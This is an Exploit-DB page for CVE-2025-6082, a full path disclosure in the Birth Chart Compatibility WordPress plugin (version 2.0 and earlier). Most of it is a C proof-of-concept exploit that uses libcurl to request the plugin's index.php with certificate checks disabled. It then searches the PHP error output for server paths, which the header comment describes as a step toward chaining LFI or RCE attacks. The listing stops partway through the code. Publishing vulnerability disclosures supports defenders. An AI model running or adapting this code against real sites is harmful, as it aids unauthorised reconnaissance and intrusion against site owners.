---
title: [webapps] Birth Chart Compatibility WordPress Plugin 2.0 - Full Path Disclosure
url: https://www.exploit-db.com/exploits/52419
source: Exploit-DB.com RSS Feed
date: 2025-08-27
fetch_date: 2025-10-07T00:48:04.827366
---

# [webapps] Birth Chart Compatibility WordPress Plugin 2.0 - Full Path Disclosure

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Birth Chart Compatibility WordPress Plugin 2.0 - Full Path Disclosure

#### EDB-ID:

###### 52419

#### CVE:

###### [2025-6082](https://nvd.nist.gov/vuln/detail/CVE-2025-6082)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-26

---

**Vulnerable App:**

```
/*
 * Exploit Title : Birth Chart Compatibility WordPress Plugin 2.0 - Full Path Disclosure
 * Author       : Byte Reaper
 * Telegram     : @ByteReaper0
 * CVE          : CVE-2025-6082
 * Software Link : https://frp.wordpress.org/plugins/birth-chart-compatibility/
 * Description  : Proof‑of‑Concept exploits the Full Path Disclosure bug in the
 *                “Birth Chart Compatibility” WordPress plugin (<=v2.0). It sends
 *                an HTTP GET request to the plugin’s index.php endpoint, captures
 *                the resulting PHP warning or fatal error, and parses the server’s
 *                filesystem path (e.g. “/var/www/html/wp-content/plugins/…” or
 *                “C:\\xampp\\htdocs\\…”). Revealing this path aids attackers in
 *                chaining further LFI/RCE or reconnaissance attacks.
 */

#include<stdio.h>
#include"argparse.h"
#include<string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <unistd.h>
#define FULL 2300
const char *url = NULL;
const char *cookies=NULL;
int selecetCookie = 0;
int verbose = 0;

void exitSyscall()
{
    __asm__ volatile
    (
        "xor %%rdi, %%rdi\n\t"
        "mov $0x3C, %%rax\n\t"
        "syscall\n\t"
        :
        :
        :"rax", "rdi"
    );
}
const char *keyFound[] =
{
    "Warning:",
    "Fatal error:",
    "/var/www/",
    "C:\\xampp\\"
};
struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        printf("\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        exitSyscall();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
void showPath(const char *targetUrl)
{
    char full[FULL];
    CURLcode curlCode;
    struct Mem response = {NULL, 0};
    CURL *curl = curl_easy_init();
    if (curl == NULL)
    {
        exitSyscall();
    }
    response.buffer = NULL;
    response.len = 0;
    if (verbose)
    {
        printf("==========================================\e[0m\n");
        printf("[+] Cleaning Response...\e[0m\n");
        printf("[+] Response Buffer : %s\e[0m\n", response.buffer);
        printf("[+] Response Len : %zu\e[0m\n", response.len);
        printf("==========================================\e[0m\n");
    }
    fflush(stdout);
    if (curl)
    {
        snprintf(full, sizeof(full), "%s/wp-content/plugins/birth-chart-compatibility/index.php", targetUrl);
        curl_easy_setopt(curl,
                         CURLOPT_URL,
                         full);
        if (selecetCookie)
        {
            curl_easy_setopt(curl,
                             CURLOPT_COOKIEFILE,
                             cookies);
            curl_easy_setopt(curl,
                             CURLOPT_COOKIEJAR,
                             cookies);

        }
        curl_easy_setopt(curl,
                         CURLOPT_ACCEPT_ENCODING,
                         "");
        curl_easy_setopt(curl,
                         CURLOPT_FOLLOWLOCATION,
                         1L);
        sleep(1);
        curl_easy_setopt(curl,
                         CURLOPT_WRITEFUNCTION,
                         write_cb);
        curl_easy_setopt(curl,
                         CURLOPT_WRITEDATA,
                         &response);
        curl_easy_setopt(curl,
                         CURLOPT_CONNECTTIMEOUT,
                         5L);
        curl_easy_setopt(curl,
                         CURLOPT_TIMEOUT,
                         10L);
        curl_easy_setopt(curl,
                         CURLOPT_SSL_VERIFYPEER,
                         0L);
        curl_easy_setopt(curl,
                         CURLOPT_SSL_VERIFYHOST,
                         0L);
        if (verbose)
        {
            printf("\e[1;35m------------------------------------------[Verbose Curl]------------------------------------------\e[0m\n");
            curl_easy_setopt(curl,
                             CURLOPT_VERBOSE,
                             1L);
        }

        struct curl_slist *h = NULL;
        h = curl_slist_append(h,
                              "Accept: text/html");
        h = curl_slist_append(h,
                              "Accept-Encoding: gzip");
        h = curl_slist_append(h,
                              "Accept-Language: en-US,en");
        h = curl_slist_append(h,
                              "Connection: keep-alive");
        h = curl_slist_append(h,
                              "Referer: http://example.com");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, h);
        long httpCode = 0;
        curlCode = curl_easy_perform(curl);
        if (curlCode == CURLE_OK)
        {
            printf("---------------------------------------------------------------------------------------\n");
            printf("\e[1;36m[+] Request sent successfully\e[0m\n");
            printf("\e[1;33m[+] Input Url : %s\e[0m\n", targetUrl);
            printf("\e[1;33m[+] Full Format Url : %s\e[0m\n",full);

            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE,
                             &httpCode);
            int numberKey = sizeof(keyFound) / sizeof(keyFound[0]);
            if (httpCode >= 200 && httpCode < 300)
            {
                printf("[+] Http Code (200 < 300) !\e[0m\n");
                printf("\e[1;32m[+] Http Code : %ld\e[0m\n", httpCode);
                printf("\e[1;35m====================================[Response]====================================\e[0m\n");
                printf("%s\n", response.buffer);
                printf("\e[1;32m[+] Response Len : %zu\e[0m\n", response.len);
                printf("\e[1;35m===================================================================================\e[0m\n\n");
                for (int k = 0; k < numberKey; k++)
                {
                    const char *found = strstr(response.buffer, keyFound[k]);
                    if (found)
                    {
                        printf("\e[1;34m[+] Keyword found: %s\e[0m\n", keyFound[k]);
                        printf("\e[1;34m[+] Context: %.100s\e[0m\n", found);
                    }
                }
            }
            else
            {
                printf("\e[1;31m[-] Http Code : %ld\e[0m\n", httpCode);
                printf("\e[1;31m[-] Please Check Your input Path !\e[0m\n");
                printf("\e[1;31m[-] Or Connection in Tragte : (%s)\e[0m\n", targetUrl);
                if (verbose)
                {
                    printf("\e[1;35m====================================[Response]====================================\n");
                    printf("%s\n", response.buffer);
                    printf("\e[1;32m[+] Response Len : %zu\e[0m\n", response.len);
                    printf("\e[1;35m===============================================...